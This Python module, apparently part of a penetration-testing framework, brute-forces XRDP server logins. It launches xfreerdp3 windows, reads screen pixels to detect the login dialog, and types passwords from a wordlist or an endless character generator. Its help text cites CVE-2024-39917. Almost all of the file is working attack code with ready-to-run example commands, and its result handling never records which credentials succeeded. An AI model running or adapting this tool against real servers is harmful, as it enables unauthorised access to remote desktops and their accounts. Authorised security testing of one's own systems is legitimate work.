import argparse
import subprocess
import time
import itertools
from enum import Enum
from dataclasses import dataclass
from typing import Generator, Optional, List
from queue import Queue
from threading import Thread, Lock, Event

from ptlibs.ptjsonlib import PtJsonLib

# XRDP dependencies
try:
    from PIL import ImageGrab
    import Xlib
    from XWindows.windows import Windows
    from pynput.mouse import Button, Controller
    from pynput.keyboard import Controller as KeyboardController
    XRDP_AVAILABLE = True
except ImportError:
    XRDP_AVAILABLE = False

from ._base import BaseModule, BaseArgs, Out


# Constants
END_OF_STREAM = None
TIME_WAIT_AFTER_LOGIN = 3
COLOR_DIF_THRESHOLD = 10


class PixelColor(Enum):
    LOADING_BLACK = ((0, 0, 0),)
    DIALOG_BUTTON = ((222, 222, 222), (0, 0, 0))
    DIALOG_LOGIN = ((222, 222, 222),)
    LOADING_TURQUOISE = ((0, 156, 181),)
    LOADING_GRAY = ((222, 222, 222), (0, 156, 181))
    OTHER = None

    @staticmethod
    def determine_type(color_set: list[tuple[tuple[int, ...]]]) -> "PixelColor":
        if not color_set:
            return PixelColor.OTHER
        colors = []
        for color_count in color_set:
            colors.append(color_count[1])
        for template in (
            PixelColor.LOADING_BLACK,
            PixelColor.LOADING_TURQUOISE,
            PixelColor.DIALOG_LOGIN,
            PixelColor.DIALOG_BUTTON,
        ):
            if all(
                all(
                    any(
                        abs(color[channel] - template_color[channel])
                        < COLOR_DIF_THRESHOLD
                        for template_color in template.value
                    )
                    for channel in range(3)
                )
                for color in colors
            ):
                return template
        return PixelColor.OTHER


class VULNS(Enum):
    WEAK_CREDS = "PTV-XRDP-WEAKCREDENTIALS"
    NO_RATE_LIMIT = "PTV-XRDP-NORATELIMIT"


@dataclass
class XRDPResults:
    valid_creds: Optional[List[dict]] = None
    tested_passwords: int = 0
    error: Optional[str] = None


def password_iterator(wordlist_path: str) -> Generator:
    """Iterator for passwords from wordlist file"""
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                yield line.strip()
    except Exception as e:
        raise Exception(f"Error reading wordlist: {str(e)}")


def password_generator(alphabet: str, length: int = 1) -> Generator:
    """Generator for brute-force passwords"""
    for ans_tuple in itertools.product(*([alphabet] * length)):
        yield "".join(ans_tuple)
    yield from password_generator(alphabet, length + 1)


class Worker(Thread):
    """Worker thread for XRDP brute-force attack"""
    
    def __init__(
        self,
        idx: int,
        window_name: str,
        in_queue: Queue,
        out_queue: Queue,
        lock: Lock,
        outside_stop_event: Event,
    ):
        super().__init__()
        
        if not XRDP_AVAILABLE:
            raise ImportError("XRDP module requires PIL, Xlib, XWindows, and pynput")
            
        disp = Xlib.display.Display()
        windows = Windows()
        active_windows = windows.getActiveWindows()
        win_id = next(
            filter(
                lambda x: isinstance(x[1], str) and x[1] == window_name, active_windows
            )
        )[0]
        self.idx = idx
        subprocess.run(
            ["wmctrl", "-R", window_name, "-e", f"1,{self.idx * 100},0,100,100"]
        )
        self.last_login = ""
        self.target_window = disp.create_resource_object("window", win_id)
        self.geometry = self.target_window.get_geometry()
        self.position = self.geometry.root.translate_coords(self.target_window.id, 0, 0)
        self.window_name = window_name
        self.mouse_ctrl = Controller()
        self.keyboard_ctrl = KeyboardController()

        self.in_queue = in_queue
        self.out_queue = out_queue
        self.lock = lock
        self.stop_event = outside_stop_event
        self.has_next_item = True
        self.last_screenshot = PixelColor.LOADING_BLACK
        self.failed_last_time = False

    def wait(self, time_s: float = 0.2):
        Event().wait(time_s)

    def skip_log(self):
        self.mouse_ctrl.position = (self.position.x + 50, self.position.y + 80)
        self.mouse_ctrl.click(Button.left)

    def login(self):
        # First click into the screen
        self.skip_log()
        self.wait(0.3)
        # Then fill in credentials
        item = self.in_queue.get()
        if item is END_OF_STREAM:
            self.has_next_item = False
            self.out_queue.put((END_OF_STREAM, self.idx))
            return
        self.keyboard_ctrl.type(item)
        self.keyboard_ctrl.type("\n")
        self.last_login = item
        self.out_queue.put(item)

    def stop(self):
        self.stop_event.set()

    def run(self):
        while not self.stop_event.is_set() and self.has_next_item:
            img = ImageGrab.grab(
                (
                    self.position.x + 40,
                    self.position.y + 40,
                    self.position.x + 60,
                    self.position.y + 60,
                )
            )
            col = img.getcolors()
            previous_event = self.last_screenshot
            window_event_type = PixelColor.determine_type(col)
            if not self.failed_last_time and window_event_type == previous_event:
                self.wait()
                continue
            self.last_screenshot = window_event_type

            if window_event_type in {
                PixelColor.LOADING_BLACK,
                PixelColor.LOADING_TURQUOISE,
            }:
                self.wait(0.3)
                self.failed_last_time = False
            elif window_event_type is PixelColor.DIALOG_BUTTON:
                self.lock.acquire()
                self.skip_log()
                self.lock.release()
                self.wait()
                self.failed_last_time = False
            elif window_event_type is PixelColor.DIALOG_LOGIN:
                self.lock.acquire()
                self.login()
                self.wait()
                self.lock.release()
                self.failed_last_time = False
            elif window_event_type is PixelColor.OTHER:
                if self.failed_last_time:
                    self.out_queue.put(END_OF_STREAM)
                    self.stop()
                    break
                else:
                    self.failed_last_time = True
                    self.wait()
            self.wait(0.1)


class XRDPArgs(BaseArgs):
    target: str
    port: int
    username: str
    wordlist: str
    alphabet: str
    threads: int

    @staticmethod
    def get_help():
        return [
            {"description": ["XRDP Testing Module"]},
            {"usage": ["ptsrvtester xrdp <command> <options>"]},
            {"usage_example": [
                "ptsrvtester xrdp bruteforce --target 192.168.1.1 --username admin --wordlist passwords.txt",
                "ptsrvtester xrdp bruteforce -t 192.168.1.1 -u ubuntu -w rockyou.txt -T 10"
            ]},
            {"options": [
                ["bruteforce", "<options>", "", "Brute-force XRDP server credentials"],
                ["", "", "", ""],
                ["-h", "--help", "", "Show this help message and exit"],
            ]},
            {"note": [
                "REQUIREMENTS:",
                "- Linux with Xorg (not Wayland)",
                "- xfreerdp3 command available",
                "- wmctrl command available",
                "- Disable screen saver/lock screen",
                "- Do not use keyboard/mouse during execution",
                "",
                "This tool uses GUI automation and requires special setup.",
                "See CVE-2024-39917 for vulnerability details."
            ]}
        ]

    def add_subparser(self, name: str, subparsers) -> None:
        """Adds a subparser of XRDP arguments"""

        examples = """example usage:
  ptsrvtester xrdp bruteforce --target 192.168.1.1 --username admin --wordlist passwords.txt
  ptsrvtester xrdp bruteforce -t 127.0.0.1 -u ubuntu -w rockyou.txt -T 10

IMPORTANT REQUIREMENTS:
  - Linux with Xorg (not Wayland)
  - xfreerdp3 and wmctrl commands must be available
  - Disable screen saver and screen lock
  - Do not use keyboard or mouse during execution
  - This uses GUI automation to bypass lack of NLA in XRDP"""

        parser = subparsers.add_parser(
            name,
            epilog=examples,
            add_help=True,
            formatter_class=argparse.RawTextHelpFormatter,
        )

        if not isinstance(parser, argparse.ArgumentParser):
            raise TypeError

        xrdp_subparsers = parser.add_subparsers(dest="command", help="Select XRDP command", required=True)

        # XRDP bruteforce
        xrdp_brute = xrdp_subparsers.add_parser("bruteforce", help="Brute-force XRDP credentials")
        xrdp_brute.add_argument("--target", "-t", required=True, help="Target server IP address")
        xrdp_brute.add_argument("--port", "-p", type=int, default=3389, help="Target server port (default: 3389)")
        xrdp_brute.add_argument("--username", "-u", required=True, help="Username to test")
        xrdp_brute.add_argument("--wordlist", "-w", help="Wordlist file with passwords (one per line)")
        xrdp_brute.add_argument(
            "--alphabet", 
            "-a", 
            default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*/`+=[]{}<>",
            help="Alphabet for brute-force if no wordlist provided"
        )
        xrdp_brute.add_argument("--threads", "-T", type=int, default=1, help="Number of parallel sessions (default: 1)")


class XRDP(BaseModule):
    @staticmethod
    def module_args() -> XRDPArgs:
        return XRDPArgs()

    def __init__(self, args: XRDPArgs, ptjsonlib: PtJsonLib):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.results = XRDPResults()

        if not XRDP_AVAILABLE:
            self.ptprint("ERROR: XRDP module requires additional packages", Out.ERROR)
            self.ptprint("Install with: pip install pillow python-xlib pynput XWindows", Out.INFO)
            self.ptprint("Also ensure xfreerdp3 and wmctrl are installed on your system", Out.INFO)
            raise ImportError("Missing required packages for XRDP module")

    def run(self) -> None:
        """Execute the XRDP brute-force attack"""
        self.ptprint(f"XRDP Brute-force Attack", Out.INFO)
        self.ptprint(f"Target: {self.args.target}:{self.args.port}", Out.INFO)
        self.ptprint(f"Username: {self.args.username}", Out.INFO)
        self.ptprint(f"Threads: {self.args.threads}", Out.INFO)
        
        # Check for required system commands
        try:
            subprocess.run(["which", "xfreerdp3"], capture_output=True, check=True)
            subprocess.run(["which", "wmctrl"], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            self.ptprint("ERROR: Required commands not found", Out.ERROR)
            self.ptprint("Please install: xfreerdp3 and wmctrl", Out.ERROR)
            return

        self.ptprint("\n[!] IMPORTANT WARNINGS:", Out.WARNING)
        self.ptprint("    - This tool uses GUI automation", Out.WARNING)
        self.ptprint("    - Do NOT use keyboard or mouse during execution", Out.WARNING)
        self.ptprint("    - Ensure screen saver is disabled", Out.WARNING)
        self.ptprint("    - Only works on Linux with Xorg (not Wayland)\n", Out.WARNING)

        if self.args.command == "bruteforce":
            self._run_bruteforce()

    def _run_bruteforce(self):
        """Run the brute-force attack"""
        # Determine password source
        if hasattr(self.args, 'wordlist') and self.args.wordlist:
            self.ptprint(f"Using wordlist: {self.args.wordlist}", Out.INFO)
            passwords_iter = password_iterator(self.args.wordlist)
        else:
            self.ptprint(f"Using brute-force with alphabet (length: {len(self.args.alphabet)} chars)", Out.INFO)
            passwords_iter = password_generator(self.args.alphabet)

        try:
            self._execute_attack(passwords_iter)
        except KeyboardInterrupt:
            self.ptprint("\n[!] Attack stopped by user", Out.INFO)
        except Exception as e:
            self.ptprint(f"[-] Error during attack: {str(e)}", Out.ERROR)
            self.results.error = str(e)

    def _execute_attack(self, passwords_iterator: Generator):
        """Execute the actual brute-force attack with multiple threads"""
        workers = []
        in_queue = Queue()
        out_queue = Queue()
        event = Event()
        lock = Lock()
        has_next_val = True

        def get_next_password():
            nonlocal has_next_val
            try:
                return next(passwords_iterator)
            except StopIteration:
                has_next_val = False
                for _ in workers:
                    in_queue.put(END_OF_STREAM)
                return None

        # Launch xfreerdp3 windows and workers
        self.ptprint("Initiating worker threads...", Out.INFO)
        for i in range(self.args.threads):
            title = f"xrdp_bane_window_{i}"
            subprocess.Popen(
                [
                    "xfreerdp3",
                    f"/v:{self.args.target}",
                    f"/port:{self.args.port}",
                    f"/u:{self.args.username}",
                    "/p:",
                    "/cert:ignore",
                    "/sec:rdp",
                    "/size:100x100",
                    f"/title:{title}",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(1)
            
            try:
                worker = Worker(i, title, in_queue, out_queue, lock, event)
                workers.append(worker)
            except Exception as e:
                self.ptprint(f"[-] Failed to create worker {i}: {str(e)}", Out.ERROR)
                continue

        # Fill initial queue
        for _ in range(len(workers)):
            pwd = get_next_password()
            if pwd:
                in_queue.put(pwd)

        # Start all workers
        self.ptprint("Starting password testing...", Out.INFO)
        for worker in workers:
            worker.start()

        # Process results
        item = out_queue.get()
        end_flags = set()
        tested_count = 0
        
        while not event.is_set() and len(end_flags) < len(workers):
            if isinstance(item, tuple) and item[0] is END_OF_STREAM:
                end_flags.add(item)
            else:
                tested_count += 1
                self.ptprint(f"[*] Tested: {item} (Total: {tested_count})", Out.INFO)
                
            if has_next_val:
                pwd = get_next_password()
                if pwd:
                    in_queue.put(pwd)
                    
            item = out_queue.get()

        # Wait for all workers to finish
        for worker in workers:
            worker.join()

        self.results.tested_passwords = tested_count
        self.ptprint(f"\n[*] Total passwords tested: {tested_count}", Out.INFO)

    def output(self) -> None:
        """Output results"""
        if self.args.json:
            self.ptjsonlib.set_status("ok")
            result_data = {
                "tested_passwords": self.results.tested_passwords,
                "valid_credentials": self.results.valid_creds,
                "error": self.results.error
            }
            self.ptjsonlib.add_vulnerability("XRDP_TESTED", result_data)
            self.ptprint(self.ptjsonlib.get_result_json(), Out.TEXT, json=True)
